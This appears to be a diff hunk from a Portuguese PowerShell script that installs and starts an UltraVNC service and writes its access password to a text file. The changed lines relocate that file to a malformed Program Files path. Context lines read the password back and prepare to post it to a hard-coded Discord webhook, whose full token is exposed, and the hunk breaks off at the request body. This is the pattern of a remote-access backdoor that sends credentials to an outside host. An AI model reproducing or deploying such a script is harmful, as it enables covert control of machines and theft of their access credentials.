@@ -55,11 +55,11 @@ net start uvnc_service
 
 echo "Finalizando Instalacao."
 rm $env:USERPROFILE\Desktop\UltraVNC*
-echo "Instalacao do VNC bem sucedida"  > "$env:USERPROFILE\Documents\VNC Senha.txt"
-echo "Senha $a" >> "$env:USERPROFILE\Documents\VNC Senha.txt"
+echo "Instalacao do VNC bem sucedida"  > "$env:C:\Program Files\VNC Senha.txt"
+echo "Senha $a" >> "$env:C:\Program Files\VNC Senha.txt"
 $wshell = New-Object -ComObject Wscript.Shell
 
-$conteudo = Get-Content -Path "USERPROFILE\Documents\VNC Senha.txt"
+$conteudo = Get-Content -Path "C:\Program Files\VNC Senha.txt"
 $webhookUrl = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"
 
 $body = @{
